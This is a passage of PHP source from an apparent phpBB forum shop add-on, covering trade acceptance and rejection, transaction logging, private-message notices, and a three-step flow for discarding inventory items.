							AND id = $itemarray[$xe]
							AND worn = 0
						LIMIT 1";
					if ( !($db->sql_query($sql)) ) 
					{ 
						message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
					}
				}
			}


			$sql = "UPDATE " . USERS_TABLE . "
				SET user_trade = ''
				WHERE user_id = {$userdata['user_id']}";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error clearing user trade!'); }

			$trade = $tradearray[4] . ' | ' . $tradearray[3] . '(' . $tradee_items . ') |FOR| ' . $tradearray[2] . ' | ' . $tradearray[1] . '(' . $trader_items . ')';

			// Transaction Code!
			$sql = "INSERT
				INTO " . TRANS_TABLE . "
				(user_id, target_id, target_name, type, action, value, timestamp, ip)
				values({$userdata['user_id']}, $tradearray[0], '" . str_replace("'", "''", $row['username']) . "', 'shop', 'trade-in', '" . str_replace("'", "''", htmlspecialchars($trade)) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction information!'); }

			$trade = $tradearray[2] . ' | ' . $tradearray[1] . '(' . $trader_items . ') |FOR| ' .$tradearray[4] . ' | ' . $tradearray[3] . '(' . $tradee_items . ')';

			$sql = "INSERT
				INTO " . TRANS_TABLE . "
				(user_id, target_id, target_name, type, action, value, timestamp, ip)
				values($tradearray[0], {$userdata['user_id']}, '" . str_replace("'", "''", $userdata['username']) . "', 'shop', 'trade-out', '" . str_replace("'", "''", htmlspecialchars($trade)) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction information!'); }

			#
			# Create Private Message!
			#
			$privmsg_subject = sprintf($lang['shop_trade_pm_accept'], $userdata['username']);
			$message = sprintf($lang['shop_trade_accept_msg'], $userdata['username']);

			cash_pm($row,$privmsg_subject,$message);

			message_die(GENERAL_MESSAGE, sprintf($lang['shop_trade_accept_exit'], $row['username']) .'<br /><br />' . sprintf($lang['u_index'], '<a href="' . append_sid("index.$phpEx") . '" class="gen">', '</a>'));
	 
		}
		elseif ($action == 'rejecttrade')
		{
			#
			# Create Private Message!
			#
			$privmsg_subject = sprintf($lang['shop_trade_pm_declined'], $userdata['username']);
			$message = sprintf($lang['shop_trade_declined_msg'], $userdata['username']);

			cash_pm($row,$privmsg_subject,$message);

			$sql = "UPDATE " . USERS_TABLE . "
				SET user_trade = ''
				WHERE user_id = {$userdata['user_id']}";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error clearing user trade!'); }

			message_die(GENERAL_MESSAGE, sprintf($lang['shop_trade_decline_exit'], $row['username']) . '<br /><br />' . sprintf($lang['u_index'], '<a href="' . append_sid("index.$phpEx") . '" class="gen">', '</a>'));

		}
	}
}

//
// End trade checks, begin discard checks!
//

elseif ( ($action == 'discard') || ($action == 'confirmdiscard') || ($action == 'discarditem') )
{
	if ($board_config['shop_discard'] == "off") { message_die(GENERAL_MESSAGE, $lang['shop_discard_disabled']); }

	if ( isset($HTTP_GET_VARS['item_id']) || isset($HTTP_POST_VARS['item_id']) ) { $item_id = ( isset($HTTP_POST_VARS['item_id']) ) ? intval($HTTP_POST_VARS['item_id']) : intval($HTTP_GET_VARS['item_id']); }
	else { $item_id = ''; }

	if ( $action == 'discard' )
	{
		$template->set_filenames(array( 
			'body' => 'shop/shop_action_discard.tpl') 
		);

		$shoplocation = ' -> <a href="shop.' . $phpEx . '?action=inventory&searchid='.$userdata['user_id'].'" class="nav">' . $lang['inventory'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=discard" class="nav">' . $lang['discard'] . '</a>'; 
		$title = $lang['shop_discard_item']; 
		$page_title = $lang['shop_discard_item']; 

		$template->assign_block_vars('switch_select_discard', array(
			'USER_ITEMS' => $user_items,

			'U_DISCARD' => append_sid("shop_actions.$phpEx?action=confirmdiscard")
		));

		$template->assign_vars(array(
			'USER_POINTS' => $userdata['user_points'],

			'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

			'L_POINTS_NAME' => $board_config['points_name'],
			'L_PERSONAL_INFO' => $lang['shop_personal_info'],
			'L_INVENTORY' => $lang['shop_your_inv'],
			'L_EXPLAIN' => $lang['shop_discard_explain1'],
			'L_SHOP_TITLE' => $title,
			'L_CURRENT_ITEMS' => $lang['shop_your_items'],
			'L_EXECUTE' => $lang['shop_execute']
		)); 
		$template->assign_block_vars('', array());
	}
	elseif ( $action == 'confirmdiscard' ) 
	{
		$template->set_filenames(array( 
			'body' => 'shop/shop_action_discard.tpl') 
		);

		//make sure user has item, prevents exploit
		if (!(userhasitem($userdata['username'], $item_id))) { message_die(GENERAL_MESSAGE, $lang['shop_donthave_item']); } 

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE id = $item_id
				AND user_id = {$userdata['user_id']}";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error deleting item from user_items table!');
		}
		$row = $db->sql_fetchrow($result);

		$shoplocation = ' -> <a href="shop.' . $phpEx . '?action=inventory&searchid='.$userdata['user_id'].'" class="nav">' . $lang['inventory'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=discard" class="nav">' . $lang['discard'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=discard" class="nav">' . $lang['shop_discard_confirm'] . '</a>'; 
		$title = $lang['shop_discard_confirm']; 
		$page_title = $lang['shop_discard_confirm']; 

		$template->assign_block_vars('switch_confirm_discard', array(
			'ITEM_ID' => $item_id,

			'U_DISCARD' => append_sid("shop_actions.$phpEx?action=discarditem")
		));

		$template->assign_vars(array(
			'USER_POINTS' => $userdata['user_points'],

			'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

			'L_PERSONAL_INFO' => $lang['shop_personal_info'],
			'L_POINTS_NAME' => $board_config['points_name'],
			'L_INVENTORY' => $lang['shop_your_inv'],
			'L_EXPLAIN' => sprintf($lang['shop_discard_explain2'], $row['item_name']),
			'L_SHOP_TITLE' => $title,
			'L_YES' => $lang['shop_yes'],
			'L_NO' => $lang['shop_no']
		)); 
		$template->assign_block_vars('', array());
	} 
	elseif ( $action == 'discarditem' ) 
	{ 
		//make sure user has item, prevents exploit
		if (!(userhasitem($userdata['username'], $item_id))) { message_die(GENERAL_MESSAGE, $lang['shop_donthave_item']); } 

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE id = $item_id
				AND user_id = {$userdata['user_id']}";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error selecting user items from table!');
		}
		$row = $db->sql_fetchrow($result);


		$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
			WHERE id = $item_id
				AND user_id = {$userdata['user_id']}
			LIMIT 1";
		if ( !($db->sql_query($sql)) ) 
		{ 
			message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
		} 

		message_die(GENERAL_MESSAGE, sprintf($lang['shop_discard_exit'], $row['item_name']) . '<br /><br />' . sprintf($lang['u_index'], '<a href="' . append_sid('index.' . $phpEx) . '" class="gen">', '</a>')); 
	}
}

//
// End discard checks, create final else.
//

else { message_die(GENERAL_MESSAGE, $lang['invalid_command']); }

// 
// Start output of page 
// 
include($phpbb_root_path . 'includes/page_header.' . $phpEx); 

// 
// Generate the page 
// 
$template->pparse('body'); 

include($phpbb_root_path . 'includes/page_tail.' . $phpEx); 

?>